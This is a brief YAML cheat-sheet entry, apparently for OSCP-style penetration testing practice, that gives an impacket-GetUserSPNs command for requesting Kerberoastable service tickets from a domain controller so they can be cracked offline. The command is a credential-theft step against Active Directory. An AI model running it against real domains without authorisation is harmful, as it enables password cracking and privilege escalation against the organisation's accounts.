---
command: |
  impacket-GetUserSPNs -dc-ip $IP $DOMAIN/$USER:$PASSWORD
description: Request Kerberoastable TGS tickets for offline cracking.
os: [Linux]
category: [oscp, cli]
service: [Kerberos]
phase: [PrivEsc]
references:
  - https://github.com/fortra/impacket
---
